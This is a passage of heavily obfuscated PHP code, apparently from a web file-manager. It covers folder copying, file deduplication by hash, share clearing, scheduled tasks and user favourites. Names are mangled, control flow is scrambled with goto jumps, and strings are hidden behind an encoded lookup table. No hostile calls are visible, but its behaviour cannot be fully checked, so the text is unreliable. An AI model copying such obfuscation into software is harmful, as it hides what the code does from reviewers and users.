$DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[432]] != $cÜ—¹†ÃŸŠ[87]; if ($D©¥Ö­ë) { $eğØ‡¯Š¹Ÿ[$cÜ—¹†ÃŸŠ[431]] = 0; } goto Cñ·–áÍ·É; a§Ş®¤—ñ: $cÜ—¹†ÃŸŠ =& $_SERVER[úÉ·öƒÑì©]; $EÆÌŠÔ¦Ï… = $this->sourceInfo($cÃ±¡••È‹); $DñÙñ½Œ¶ = $this->sourceInfo($B¡™…¸“ ğ); goto fÍ¾Âò–åá; fÃ¨æª»¤Ù: } private function clearShare($cŸ´‘ôô‹, $C±”ğà³‘á) { goto CŒê–‘½õÊ; DÇñ„÷åÁº: if ($Bõ‡¹£¸ÄÅ[$fÎÎ•Ûˆøï[493]] == $D¡Ã†¾ã[$fÎÎ•Ûˆøï[493]] && $Bõ‡¹£¸ÄÅ[$fÎÎ•Ûˆøï[413]] == $fÎÎ•Ûˆøï[571]) { return; } $EîÖ±äÀ¡« = array($fÎÎ•Ûˆøï[496] => array($fÎÎ•Ûˆøï[521], $Bõ‡¹£¸ÄÅ[$fÎÎ•Ûˆøï[496]] . $cŸ´‘ôô‹ . $fÎÎ•Ûˆøï[522])); $bªˆœãÑŞ† = $this->field($fÎÎ•Ûˆøï[419])->where($EîÖ±äÀ¡«)->getField($fÎÎ•Ûˆøï[404], !0); goto EÙŒ„Õ™ù; c×Î†Îõ¸·: if (!$B‰À…ª”Õ¹) { return; } $B‰À…ª”Õ¹ = array_to_keyvalue($B‰À…ª”Õ¹, $fÎÎ•Ûˆøï[33], $fÎÎ•Ûˆøï[477]); $EîÖ±äÀ¡« = array($fÎÎ•Ûˆøï[477] => array($fÎÎ•Ûˆøï[7], $B‰À…ª”Õ¹)); goto e¦«ò‰‡Ú’; e¦«ò‰‡Ú’: Model($fÎÎ•Ûˆøï[572])->where($EîÖ±äÀ¡«)->save(array($fÎÎ•Ûˆøï[484] => 0)); Model($fÎÎ•Ûˆøï[573])->where($EîÖ±äÀ¡«)->delete(); goto A¨•„Îê”…; EÙŒ„Õ™ù: if (!$bªˆœãÑŞ†) { return; } $EîÖ±äÀ¡« = array($fÎÎ•Ûˆøï[404] => array($fÎÎ•Ûˆøï[7], $bªˆœãÑŞ†), $fÎÎ•Ûˆøï[484] => 1); $B‰À…ª”Õ¹ = Model($fÎÎ•Ûˆøï[572])->field($fÎÎ•Ûˆøï[477])->where($EîÖ±äÀ¡«)->select(); goto c×Î†Îõ¸·; CŒê–‘½õÊ: $fÎÎ•Ûˆøï =& $_SERVER[úÉ·öƒÑì©]; $Bõ‡¹£¸ÄÅ = $this->sourceInfo($cŸ´‘ôô‹); $D¡Ã†¾ã = $this->sourceInfo($C±”ğà³‘á); goto DÇñ„÷åÁº; A¨•„Îê”…: } public function copyFolderFromIO($cğ´¾İˆÚ…, $cË¾éÀ‡â, $cö¨ÚÎ‡º, $aÈÎÉÑ, $d½£Ş¬óî¥, $Ağì”ªĞ‘ = false) { goto d·Šªçø; AÇ†Œ»°Ô: $this->updateModifyTime($cö¨ÚÎ‡º); return $dÑ…¬µËÆ; goto BÒ¦£Ã¨²; fï¡Šòí›£: $A‹–ºÑŞİ = $this->fileNameExist($cö¨ÚÎ‡º, $B½ó»èçî»); $dÑ…¬µËÆ = $this->mkdir($cö¨ÚÎ‡º, $B½ó»èçî», $aÈÎÉÑ); if (!$A‹–ºÑŞİ || $aÈÎÉÑ == REPEAT_RENAME_FOLDER) { $aÈÎÉÑ = !1; } goto F‰ÆòŞšì¼; bÖ¼¦Í´¾: Model($C™©§ô••½[541])->addAll($dõ„‹ğé ç[$C™©§ô••½[539]], array(), !0); Model($C™©§ô••½[542])->eventCopy($dÑ…¬µËÆ); $this->saveAll($dõ„‹ğé ç[$C™©§ô••½[540]]); goto bĞ“—­¬ó†; F‰ÆòŞšì¼: if ($A‹–ºÑŞİ) { $this->_childrenAllMake($A‹–ºÑŞİ); } Hook::trigger($C™©§ô••½[575]); $this->_copyChildTo($cğ´¾İˆÚ…, $cË¾éÀ‡â, $dÑ…¬µËÆ, $aÈÎÉÑ, $dõ„‹ğé ç, $d½£Ş¬óî¥); goto aò¹²æ„ö ; bĞ“—­¬ó†: Model($C™©§ô••½[459])->linkAdd($dõ„‹ğé ç[$C™©§ô••½[538]]); Model($C™©§ô••½[459])->remove($dõ„‹ğé ç[$C™©§ô••½[574]]); $this->folderSizeReset($cö¨ÚÎ‡º); goto AÇ†Œ»°Ô; aò¹²æ„ö : Hook::trigger($C™©§ô••½[576]); if ($dÑ…¬µËÆ) { $this->folderSizeResetChildren($dÑ…¬µËÆ); } $this->_childrenListClear(); goto bÖ¼¦Í´¾; d·Šªçø: $C™©§ô••½ =& $_SERVER[úÉ·öƒÑì©]; $dõ„‹ğé ç = array($C™©§ô••½[539] => array(), $C™©§ô••½[540] => array(), $C™©§ô••½[538] => array(), $C™©§ô••½[574] => array()); $B½ó»èçî» = $Ağì”ªĞ‘ ? $Ağì”ªĞ‘ : $cğ´¾İˆÚ…->pathThis($cË¾éÀ‡â); goto fï¡Šòí›£; BÒ¦£Ã¨²: } private function _copyChildTo($a‚ÖÎ‹°„ó, $bÖßĞÇ××, $dØËÓšéƒæ, $cô»‘éŒÓ¡, &$bßÈøÎ˜³, $fìª”ÆŒ”Ï) { goto cÓÄÑ„°µŒ; b·ªÇ¦ê½: if (!empty($A§ÃíÙæÅÜ)) { $this->addAll($A§ÃíÙæÅÜ); $this->_childrenListSelect($dØËÓšéƒæ); } $f—”‹³ã–‚ = $this->_childrenList($dØËÓšéƒæ); $f—”‹³ã–‚ = array_to_keyvalue($f—”‹³ã–‚, $fšë‘Ë™¤[28]); goto AÂ®¸‹Ğ—; cÓÄÑ„°µŒ: $fšë‘Ë™¤ =& $_SERVER[úÉ·öƒÑì©]; $DöšäîğÆù = $this->sourceInfoCache($dØËÓšéƒæ); $a†â±±ç™ = $a‚ÖÎ‹°„ó->listPath($bÖßĞÇ××); goto eøÅàõâ‹; eøÅàõâ‹: $a†â±±ç™ = $a†â±±ç™ ? $a†â±±ç™ : array($fšë‘Ë™¤[74] => array(), $fšë‘Ë™¤[75] => array()); $B¹Û¯›Íà¢ = array_merge($a†â±±ç™[$fšë‘Ë™¤[74]], $a†â±±ç™[$fšë‘Ë™¤[75]]); $D—ê³”ô = $this->_addFiles($a‚ÖÎ‹°„ó, $a†â±±ç™[$fšë‘Ë™¤[74]], $fìª”ÆŒ”Ï); goto bÌÙøŠîĞ©; bÌÙøŠîĞ©: $A§ÃíÙæÅÜ = array(); foreach ($B¹Û¯›Íà¢ as &$A‰¾…¯Ñƒ) { goto fÃÉ“ÚçÓ†; BÊÕá»Ú¼: $A‰¾…¯Ñƒ[$fšë‘Ë™¤[78]] = _get($A‰¾…¯Ñƒ, $fšë‘Ë™¤[78], 0); $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]] = _get($A‰¾…¯Ñƒ, $fšë‘Ë™¤[456], 0); if (!isset($A‰¾…¯Ñƒ[$fšë‘Ë™¤[577]]) && $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]]) { $bßÈøÎ˜³[$fšë‘Ë™¤[574]][] = $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]]; } goto CÓŠÓè›ÈŸ; fÃÉ“ÚçÓ†: if (isset($D—ê³”ô[$A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]]])) { $A‰¾…¯Ñƒ = $D—ê³”ô[$A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]]]; } $A‰¾…¯Ñƒ[$fšë‘Ë™¤[412]] = $A‰¾…¯Ñƒ[$fšë‘Ë™¤[29]] == $fšë‘Ë™¤[77]; $A‰¾…¯Ñƒ[$fšë‘Ë™¤[414]] = _get($A‰¾…¯Ñƒ, $fšë‘Ë™¤[168], $fšë‘Ë™¤[33]); goto BÊÕá»Ú¼; CÓŠÓè›ÈŸ: if ($cô»‘éŒÓ¡) { $a Ç„Š±“º = $this->fileNameExistCache($dØËÓšéƒæ, $A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]]); if ($a Ç„Š±“º) { if ($A‰¾…¯Ñƒ[$fšë‘Ë™¤[412]] || $cô»‘éŒÓ¡ == REPEAT_SKIP) { continue; } if ($cô»‘éŒÓ¡ == REPEAT_REPLACE) { $Cè®÷³î‹‰ = $this->sourceInfoCache($a Ç„Š±“º); $aÌæ›Ú£„Ü = $this->fileHistory($Cè®÷³î‹‰, $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]], $A‰¾…¯Ñƒ[$fšë‘Ë™¤[78]]); if ($aÌæ›Ú£„Ü) { $bßÈøÎ˜³[$fšë‘Ë™¤[538]][] = $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]]; } continue; } else { if ($cô»‘éŒÓ¡ == REPEAT_RENAME) { $A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]] = $this->fileNameAutoCache($dØËÓšéƒæ, $A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]], $cô»‘éŒÓ¡, !1); } } } } if (!$A‰¾…¯Ñƒ[$fšë‘Ë™¤[412]] && $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]]) { $bßÈøÎ˜³[$fšë‘Ë™¤[538]][] = $A‰¾…¯Ñƒ[$fšë‘Ë™¤[456]]; } $A§ÃíÙæÅÜ[] = $this->_makeItemData($A‰¾…¯Ñƒ, $DöšäîğÆù, $A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]]); goto a¹Ïª¥‹Û; a¹Ïª¥‹Û: } unset($A‰¾…¯Ñƒ); goto b·ªÇ¦ê½; AÂ®¸‹Ğ—: foreach ($B¹Û¯›Íà¢ as $A‰¾…¯Ñƒ) { $Cè®÷³î‹‰ = $f—”‹³ã–‚[$A‰¾…¯Ñƒ[$fšë‘Ë™¤[28]]]; $fåŸÊ†ê–™ = $Cè®÷³î‹‰[$fšë‘Ë™¤[404]]; $this->_copyApplyMeta($Cè®÷³î‹‰, $bßÈøÎ˜³); if ($A‰¾…¯Ñƒ[$fšë‘Ë™¤[29]] == $fšë‘Ë™¤[77]) { $A‰¾…¯Ñƒ[$fšë‘Ë™¤[76]] = $a‚ÖÎ‹°„ó->getPathInner($A‰¾…¯Ñƒ[$fšë‘Ë™¤[76]]); $this->_copyChildTo($a‚ÖÎ‹°„ó, $A‰¾…¯Ñƒ[$fšë‘Ë™¤[76]], $fåŸÊ†ê–™, $cô»‘éŒÓ¡, $bßÈøÎ˜³, $fìª”ÆŒ”Ï); } } goto CëšµŒºÆ¾; CëšµŒºÆ¾: } private function _addFiles($Dœ÷ŒøßáÂ, $aİğ†òòá‹, $b»Ë®ò…Òé) { goto d®¡¬§Ò·; eÍ«‘¾òõ: $a©óÂáƒÉ->addAll($E¼Ÿ††Û); $DÜ¿ĞÏ•˜§ = array($d¸ÓÓ‡ê½š[170] => array($d¸ÓÓ‡ê½š[7], array_keys($a¥ˆƒ»ŞÛ¢))); $c¶Â½¦³˜İ = $a©óÂáƒÉ->where($DÜ¿ĞÏ•˜§)->select(); goto bÊ¢‰‰¦·Ï; d®¡¬§Ò·: $d¸ÓÓ‡ê½š =& $_SERVER[úÉ·öƒÑì©]; if (!$aİğ†òòá‹ || count($aİğ†òòá‹) == 0) { return array(); } $a¥ˆƒ»ŞÛ¢ = array(); goto C†œÃÂÜ¸â; bÊ¢‰‰¦·Ï: $c¶Â½¦³˜İ = $c¶Â½¦³˜İ ? $c¶Â½¦³˜İ : array(); foreach ($c¶Â½¦³˜İ as $b‚¹ÑĞµªÆ) { if (!isset($a¥ˆƒ»ŞÛ¢[$b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[170]]])) { continue; } $cÖ´óƒŠÒ¼ =& $a¥ˆƒ»ŞÛ¢[$b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[170]]]; foreach ($cÖ´óƒŠÒ¼ as &$Dö½“í×‘¯) { $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[456]] = $b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[456]]; } unset($Dö½“í×‘¯); } $Dµ„¨¿Àåï = array(); goto aµî¤»Øêİ; D÷º´ø²‹: $a©óÂáƒÉ = Model($d¸ÓÓ‡ê½š[580]); $c¶Â½¦³˜İ = $a©óÂáƒÉ->where($DÜ¿ĞÏ•˜§)->select(); $c¶Â½¦³˜İ = $c¶Â½¦³˜İ ? $c¶Â½¦³˜İ : array(); goto D­¨ÈœÑÃ§; aµî¤»Øêİ: foreach ($aİğ†òòá‹ as $fö‹…‹³àŸ) { $Dµ„¨¿Àåï[$fö‹…‹³àŸ[$d¸ÓÓ‡ê½š[28]]] = $fö‹…‹³àŸ; } return $Dµ„¨¿Àåï; goto Bîöáˆ»¸‡; C†œÃÂÜ¸â: foreach ($aİğ†òòá‹ as &$Dö½“í×‘¯) { goto bá¬âØ›£; bá¬âØ›£: Hook::trigger($d¸ÓÓ‡ê½š[578], $Dö½“í×‘¯); $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[76]] = $Dœ÷ŒøßáÂ->getPathInner($Dö½“í×‘¯[$d¸ÓÓ‡ê½š[76]]); $A‹èãô¨Œ§ = $Dœ÷ŒøßáÂ->hashSimple($Dö½“í×‘¯[$d¸ÓÓ‡ê½š[76]]); goto CêØèöç¼Ì; fŞİŞŠ«Ê: $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[170]] = $CÑÌÛ¥ª¿é; Hook::trigger($d¸ÓÓ‡ê½š[579], $Dö½“í×‘¯); $a¥ˆƒ»ŞÛ¢[$CÑÌÛ¥ª¿é][] =& $Dö½“í×‘¯; goto bµ®È…™¨Ê; bµ®È…™¨Ê: if (count($a¥ˆƒ»ŞÛ¢[$CÑÌÛ¥ª¿é]) > 1) { $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[577]] = !0; } goto c™»®§ö¾Ä; CêØèöç¼Ì: $CÑÌÛ¥ª¿é = $Dœ÷ŒøßáÂ->hashMd5($Dö½“í×‘¯[$d¸ÓÓ‡ê½š[76]]); if (strlen($CÑÌÛ¥ª¿é) > 10 && !isset($a¥ˆƒ»ŞÛ¢[$CÑÌÛ¥ª¿é])) { $a¥ˆƒ»ŞÛ¢[$CÑÌÛ¥ª¿é] = array(); } $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[171]] = $A‹èãô¨Œ§; goto fŞİŞŠ«Ê; c™»®§ö¾Ä: } unset($Dö½“í×‘¯); $DÜ¿ĞÏ•˜§ = array($d¸ÓÓ‡ê½š[170] => array($d¸ÓÓ‡ê½š[7], array_keys($a¥ˆƒ»ŞÛ¢))); goto D÷º´ø²‹; D­¨ÈœÑÃ§: foreach ($c¶Â½¦³˜İ as $b‚¹ÑĞµªÆ) { if (!isset($a¥ˆƒ»ŞÛ¢[$b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[170]]])) { continue; } $Bˆ­âß¦†¿ = $a¥ˆƒ»ŞÛ¢[$b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[170]]]; foreach ($Bˆ­âß¦†¿ as &$Dö½“í×‘¯) { $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[456]] = $b‚¹ÑĞµªÆ[$d¸ÓÓ‡ê½š[456]]; $Dö½“í×‘¯[$d¸ÓÓ‡ê½š[577]] = !0; } unset($Dö½“í×‘¯); } $E¼Ÿ††Û = array(); foreach ($aİğ†òòá‹ as $DŠäšØî) { if (isset($DŠäšØî[$d¸ÓÓ‡ê½š[577]]) && $DŠäšØî[$d¸ÓÓ‡ê½š[577]]) { continue; } $Eœ¯Šàë¼ = $Dœ÷ŒøßáÂ->getPathInner($DŠäšØî[$d¸ÓÓ‡ê½š[76]]); $DÆ¢Œ¯°¾å = $a©óÂáƒÉ->addFileMake($Eœ¯Šàë¼, $DŠäšØî[$d¸ÓÓ‡ê½š[78]], $DŠäšØî[$d¸ÓÓ‡ê½š[171]], $DŠäšØî[$d¸ÓÓ‡ê½š[170]], $DŠäšØî[$d¸ÓÓ‡ê½š[28]], $b»Ë®ò…Òé); $E¼Ÿ††Û[] = $DÆ¢Œ¯°¾å; } goto eÍ«‘¾òõ; Bîöáˆ»¸‡: } } define($_SERVER[úÉ·öƒÑì©][581], $_SERVER[úÉ·öƒÑì©][582]); goto b£ä‰¯ã—; D‰ë·İ¤é: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x74\x61\x73\x6b\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x74\171\160\145", "\145\x76\x65\x6e\x74", "\x74\151\155\145", "\144\x65\163\x63", "\163\x79\x73\x74\x65\155", "\145\156\141\142\154\145", "\154\141\x73\164\x52\x75\156", "\x73\x6f\x72\x74"); public function listData($c×¡»ß¢”Ö = false, $FîÙ£†ëãË = "\163\157\162\x74", $FœôÙí™•ì = false) { return parent::listData($c×¡»ß¢”Ö, $FîÙ£†ëãË, $FœôÙí™•ì); } public function add($bÓ¥Ù…Ö†Ï) { $dÀãÖµßÆò =& $_SERVER[úÉ·öƒÑì©]; $CÁÈÏçÅƒ” = $this->findByName($bÓ¥Ù…Ö†Ï[$dÀãÖµßÆò[28]]); if ($CÁÈÏçÅƒ”) { return !1; } $bÓ¥Ù…Ö†Ï[$dÀãÖµßÆò[1500]] = 0; $bÓ¥Ù…Ö†Ï[$dÀãÖµßÆò[1722]] = $this->getSort(); return parent::insert($bÓ¥Ù…Ö†Ï); } private function getSort() { $EôùÛ’“õÛ =& $_SERVER[úÉ·öƒÑì©]; $B‹×‡·¶”‚ = parent::listData(); $CºÚÎÑÃÙ = array_to_keyvalue($B‹×‡·¶”‚, $EôùÛ’“õÛ[33], $EôùÛ’“õÛ[1722]); return empty($CºÚÎÑÃÙ) ? 0 : max($CºÚÎÑÃÙ) + 1; } public function update($DİŠˆ¦¥Öê, $AÕ»è°Î‘¡) { $C×˜¸«—ã· =& $_SERVER[úÉ·öƒÑì©]; $A®ÆŸ£‘“ = $this->listData($DİŠˆ¦¥Öê); $fÍ¬š–Õ´Ó = $this->findByName($AÕ»è°Î‘¡[$C×˜¸«—ã·[28]]); if (!$A®ÆŸ£‘“ || $fÍ¬š–Õ´Ó && $fÍ¬š–Õ´Ó[$C×˜¸«—ã·[402]] != $A®ÆŸ£‘“[$C×˜¸«—ã·[402]]) { return !1; } return parent::update($DİŠˆ¦¥Öê, $AÕ»è°Î‘¡); } public function remove($c„µÖ¢Í’², $E¥‚Ø–†£ = false) { $E¹ÛË¿œš =& $_SERVER[úÉ·öƒÑì©]; $FªÆÔïÓåĞ = $this->listData($c„µÖ¢Í’²); if (!$FªÆÔïÓåĞ) { return; } if (!$E¥‚Ø–†£ && $FªÆÔïÓåĞ[$E¹ÛË¿œš[1178]] == $E¹ÛË¿œš[87]) { return !1; } return parent::remove($c„µÖ¢Í’²); } public function enable($a‚„ñö‰çÄ, $bƒçÎµË‰) { return $this->update($a‚„ñö‰çÄ, array($_SERVER[úÉ·öƒÑì©][2109] => $bƒçÎµË‰)); } public function run($BÚ ×Úàßæ) { return $this->update($BÚ ×Úàßæ, array($_SERVER[úÉ·öƒÑì©][2119] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($C†è»ç–”§) { $eù‹¶ÑÉ¢» =& $_SERVER[úÉ·öƒÑì©]; return array($eù‹¶ÑÉ¢»[1801] => array(USER_ID, $eù‹¶ÑÉ¢»[2120])); } protected function listData() { $CÔ¢Ê®ÒÊ” =& $_SERVER[úÉ·öƒÑì©]; $bÍİØ¸Ûè˜ = array($CÔ¢Ê®ÒÊ”[1527] => USER_ID, $CÔ¢Ê®ÒÊ”[472] => 0); $E¬™Ô²ºîë = $CÔ¢Ê®ÒÊ”[2121]; $C˜Š¸ÙºÉ = $this->field($E¬™Ô²ºîë)->where($bÍİØ¸Ûè˜)->order($CÔ¢Ê®ÒÊ”[2122])->select(); return $C˜Š¸ÙºÉ ? $C˜Š¸ÙºÉ : array(); } protected function resetCache() { } protected function listView() { goto A¢œÈ¢˜²Í; A¢œÈ¢˜²Í: $c×¬¸ãÀ×± =& $_SERVER[úÉ·öƒÑì©]; $D×öÕâœ¢Š = $this->listData(); $C¹ªŒà„Šä = array_filter_by_field($D×öÕâœ¢Š, $c×¬¸ãÀ×±[29], $c×¬¸ãÀ×±[418]); goto aíƒƒ—ªÕ; DŠ³“Êôæ‡: $eá’Ÿ¸ô¡¯ = array_to_keyvalue($eá’Ÿ¸ô¡¯, $c×¬¸ãÀ×±[404]); foreach ($D×öÕâœ¢Š as $Bì‡’êèŸÓ => $fÂÏ»ÆâÒñ) { $cİÁÌå´áÜ = $eá’Ÿ¸ô¡¯[$fÂÏ»ÆâÒñ[$c×¬¸ãÀ×±[76]]]; $cİÁÌå´áÜ = $cİÁÌå´áÜ ? $cİÁÌå´áÜ : array(); $D×öÕâœ¢Š[$Bì‡’êèŸÓ] = array_merge($cİÁÌå´áÜ, $fÂÏ»ÆâÒñ); } return $D×öÕâœ¢Š; goto EÎ…£Ö‚Òì; aíƒƒ—ªÕ: $B¾Ş¦ìˆŠœ = array_to_keyvalue($C¹ªŒà„Šä, $c×¬¸ãÀ×±[33], $c×¬¸ãÀ×±[76]); if (!$B¾Ş¦ìˆŠœ) { return $D×öÕâœ¢Š; } $b¹ÔÅ İÑ = 2000; goto fŸ‹ãÒØÃ’; fŸ‹ãÒØÃ’: $FÓèÒšœŒ² = array($c×¬¸ãÀ×±[419] => array($c×¬¸ãÀ×±[420], $B¾Ş¦ìˆŠœ)); $eá’Ÿ¸ô¡¯ = Model($c×¬¸ãÀ×±[806])->listSource($FÓèÒšœŒ², $b¹ÔÅ İÑ); $eá’Ÿ¸ô¡¯ = array_merge($eá’Ÿ¸ô¡¯[$c×¬¸ãÀ×±[74]], $eá’Ÿ¸ô¡¯[$c×¬¸ãÀ×±[75]]); goto DŠ³“Êôæ‡; EÎ…£Ö‚Òì: } protected function addFav($a¯ŒĞƒé§î, $dÜğ÷ï»è = '', $e˜§Õ§Ò‚ë = "\163\157\x75\162\143\145") { goto aÂÍ†ç‰š; eˆÆ×¸ğª: $FŒì‹Åìí‚ = array($fŒñŒàáŠª[1527] => USER_ID, $fŒñŒàáŠª[472] => 0); $c²ëà«‡÷Ç = $this->where($FŒì‹Åìí‚)->max($fŒñŒàáŠª[1722]); if (!$c²ëà«‡÷Ç) { $c²ëà«‡÷Ç = 0; } goto a×°èŞëš¯; aÂÍ†ç‰š: $fŒñŒàáŠª =& $_SERVER[úÉ·öƒÑì©]; $FŒì‹Åìí‚ = array($fŒñŒàáŠª[1527] => USER_ID, $fŒñŒàáŠª[472] => 0, $fŒñŒàáŠª[424] => $e˜§Õ§Ò‚ë, $fŒñŒàáŠª[423] => $a¯ŒĞƒé§î); if ($this->where($FŒì‹Åìí‚)->find()) { return !1; } goto eˆÆ×¸ğª; bå„ŞÀÑö‰: return $this->add($e²•™íÖï¨); goto FÜøãÒ™œã; a×°èŞëš¯: if (!$dÜğ÷ï»è && $e˜§Õ§Ò‚ë == $fŒñŒàáŠª[418]) { $fÎšŠƒöĞÍ = Model($fŒñŒàáŠª[1213])->where(array($fŒñŒàáŠª[419] => $a¯ŒĞƒé§î))->find(); if (!$fÎšŠƒöĞÍ) { return !1; } $dÜğ÷ï»è = $fÎšŠƒöĞÍ[$fŒñŒàáŠª[28]]; } $dÜğ÷ï»è = $this->getAutoName($dÜğ÷ï»è); $e²•™íÖï¨ = array($fŒñŒàáŠª[1527] => USER_ID, $fŒñŒàáŠª[472] => 0, $fŒñŒàáŠª[422] => $dÜğ÷ï»è, $fŒñŒàáŠª[423] => $a¯ŒĞƒé§î, $fŒñŒàáŠª[424] => $e˜§Õ§Ò‚ë, $fŒñŒàáŠª[1703] => $c²ëà«‡÷Ç + 1); goto bå„ŞÀÑö‰; FÜøãÒ™œã: } protected function remove($f Ş†•Ë…ï) { $eªŸæßÎÔÑ =& $_SERVER[úÉ·öƒÑì©]; $e†Ûó—µä„ = array($eªŸæßÎÔÑ[1527] => USER_ID, $eªŸæßÎÔÑ[421] => $f Ş†•Ë…ï); return $this->where($e†Ûó—µä„)->delete(); } protected function removeByName($d£¼¬¹Ê»â) { $E“Á¸‚®© =& $_SERVER[úÉ·öƒÑì©]; $eÙ¹Œ†Æ³Ğ = array($E“Á¸‚®©[1527] => USER_ID, $E“Á¸‚®©[422] => $d£¼¬¹Ê»â, $E“Á¸‚®©[472] => 0); return $this->where($eÙ¹Œ†Æ³Ğ)->delete(); } protected function rename($C÷é¼¢ƒšÖ, $DÙùŠŸÅ‘) { $C¹ï¸ÃŠÓÆ =& $_SERVER[úÉ·öƒÑì©]; if ($C÷é¼¢ƒšÖ == $DÙùŠŸÅ‘) { return !1; } $EÛè‚ˆå¤¢ = $this->getAutoName($DÙùŠŸÅ‘); if ($DÙùŠŸÅ‘ != $EÛè‚ˆå¤¢) { return !1; } $C‹Â´ğ“ßº = array($C¹ï¸ÃŠÓÆ[1527] => USER_ID, $C¹ï¸ÃŠÓÆ[472] => 0, $C¹ï¸ÃŠÓÆ[28] => $C÷é¼¢ƒšÖ); return $this->where($C‹Â´ğ“ßº)->save(array($C¹ï¸ÃŠÓÆ[28] => $DÙùŠŸÅ‘)); } protected function resetSort($D‹¦ÍŞ†Ìœ) { $eÁŸ¹âíÌ =& $_SERVER[úÉ·öƒÑì©]; $D‹¦ÍŞ†Ìœ = is_array($D‹¦ÍŞ†Ìœ) ? $D‹¦ÍŞ†Ìœ : array(); $d‚©õ¾Ã‡ = array($eÁŸ¹âíÌ[1527] => USER_ID); for ($E±ç¯¼§¯ = 0; $E±ç¯¼§¯ < count($D‹¦ÍŞ†Ìœ); $E±ç¯¼§¯++) { $d‚©õ¾Ã‡[$eÁŸ¹âíÌ[421]] = $D‹¦ÍŞ†Ìœ[$E±ç¯¼§¯]; $this->where($d‚©õ¾Ã‡)->save(array($eÁŸ¹âíÌ[1703] => $E±ç¯¼§¯ + 1)); } return !0; } protected function moveTop($f¸à—å›Å) { goto aååÍè§ò; D¨Ÿ¯„–×Ã: return $this->resetSort($c…Ëí¸«¡¬); goto f‰¬éß±Â; aååÍè§ò: $dÆä £›‚Ş =& $_SERVER[úÉ·öƒÑì©]; $Fƒ½¬—Í´Ë = array($dÆä £›‚Ş[1527] => USER_ID, $dÆä £›‚Ş[472] => 0); $CİÍ­º = $this->where($Fƒ½¬—Í´Ë)->where(array($dÆä £›‚Ş[28] => $f¸à—å›Å))->find(); goto e†¡ È íİ; e†¡ È íİ: if (!$CİÍ­º) { return; } $c…Ëí¸«¡¬ = $this->field($dÆä £›‚Ş[402])->where($Fƒ½¬—Í´Ë)->order($dÆä £›‚Ş[2122])->select(); $c…Ëí¸«¡¬ = array_to_keyvalue($c…Ëí¸«¡¬, $dÆä £›‚Ş[33], $dÆä £›‚Ş[402]); goto bíÉ¥¼‹‡; bíÉ¥¼‹‡: $E­Ò‚†ï©´ = $c…Ëí¸«¡¬; $c…Ëí¸«¡¬ = array_remove_value($c…Ëí¸«¡¬, $CİÍ­º[$dÆä £›‚Ş[402]]); array_unshift($c…Ëí¸«¡¬, $CİÍ­º[$dÆä £›‚Ş[402]]); goto D¨Ÿ¯„–×Ã; f‰¬éß±Â: } protected function moveBottom($D®›áâ©¯Û) { $fˆö¹Ø„ƒİ =& $_SERVER[úÉ·öƒÑì©]; $f·Æ’…êô‘ = array($fˆö¹Ø„ƒİ[1527] => USER_ID, $fˆö¹Ø„ƒİ[472] => 0); $eÂ—ÜÛÌ¦ñ = $this->where($f·Æ’…êô‘)->max($fˆö¹Ø„ƒİ[1722]); $eø®ÈÎÄ‹› = array($fˆö¹Ø„ƒİ[1722] => $eÂ—ÜÛÌ¦ñ + 1); return $this->where($f·Æ’…êô‘)->where(array($fˆö¹Ø„ƒİ[28] => $D®›áâ©¯Û))->save($eø®ÈÎÄ‹›); } private function getAutoName($dÀ¿¹ó¥¹¤) { goto FŠîìĞ³; FŠîìĞ³: $cö·Âáª”™ =& $_SERVER[úÉ·öƒÑì©]; $Fˆç„Û¹ò± = array($cö·Âáª”™[1527] => USER_ID, $cö·Âáª”™[472] => 0); $bÁ‘Ï´àè‡ = $this->field($cö·Âáª”™[28])->where($Fˆç„Û¹ò±)->select(); goto Dê¬¦æ†; Dê¬¦æ†: $bÁ‘Ï´àè‡ = array_to_keyvalue($bÁ‘Ï´àè‡, $cö·Âáª”™[33], $cö·Âáª”™[28]); if (!$bÁ‘Ï´àè‡ || !in_array($dÀ¿¹ó¥¹¤, $bÁ‘Ï´àè‡)) { return $dÀ¿¹ó¥¹¤; } for ($BÌ‹éÀÙ = 0; $BÌ‹éÀÙ < count($bÁ‘Ï´àè‡); $BÌ‹éÀÙ++) { if (!in_array($dÀ¿¹ó¥¹¤ . "\50{$BÌ‹éÀÙ}\51", $bÁ‘Ï´àè‡)) { return $dÀ¿¹ó¥¹¤ . "\x28{$BÌ‹éÀÙ}\51"; } } goto CäÍëÀÌ”Í; CäÍëÀÌ”Í: return $dÀ¿¹ó¥¹¤ . "\x28{$BÌ‹éÀÙ}\51"; goto Bá»†ìÖÇ´; Bá»†ìÖÇ´: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6a\157\142\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x64\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\x65\x6c\x66\x4a\x6f\x62\x4c\x69\x73\x74"; public function listData($a“çš¼´ÒÓ = false, $cÄ½…ÚÄ©¼ = "\163\x6f\x72\x74", $cÆ™±÷Š·Û = false) { return 